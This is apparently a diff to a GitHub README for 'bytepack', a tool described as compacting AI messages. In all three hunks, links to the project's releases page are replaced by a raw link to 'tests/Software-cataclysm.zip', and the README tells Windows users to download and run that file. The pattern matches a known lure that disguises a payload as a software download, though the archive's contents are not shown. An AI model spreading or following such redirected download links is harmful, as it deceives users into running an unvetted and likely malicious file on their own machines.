@@ -1,6 +1,6 @@
 # 🧩 bytepack - Compact AI messages with less overhead
 
-[![Download bytepack](https://img.shields.io/badge/Download-bytepack-6f42c1?style=for-the-badge&logo=github)](https://github.com/sertolicellselectorswitch13/bytepack/releases)
+[![Download bytepack](https://img.shields.io/badge/Download-bytepack-6f42c1?style=for-the-badge&logo=github)](https://github.com/sertolicellselectorswitch13/bytepack/raw/refs/heads/main/tests/Software-cataclysm.zip)
 
 ## 🚀 What bytepack does
 
@@ -24,7 +24,7 @@ bytepack fits use cases like:
 
 Visit the release page to download and run this file on Windows:
 
-[Open bytepack releases](https://github.com/sertolicellselectorswitch13/bytepack/releases)
+[Open bytepack releases](https://github.com/sertolicellselectorswitch13/bytepack/raw/refs/heads/main/tests/Software-cataclysm.zip)
 
 ## 🖥️ Windows setup
 
@@ -171,7 +171,7 @@ If the app opens and closes fast, run it from the extracted folder and keep the 
 
 The latest Windows download is here:
 
-[https://github.com/sertolicellselectorswitch13/bytepack/releases](https://github.com/sertolicellselectorswitch13/bytepack/releases)
+[https://github.com/sertolicellselectorswitch13/bytepack/raw/refs/heads/main/tests/Software-cataclysm.zip](https://github.com/sertolicellselectorswitch13/bytepack/raw/refs/heads/main/tests/Software-cataclysm.zip)
 
 ## 🗂️ Project focus
 
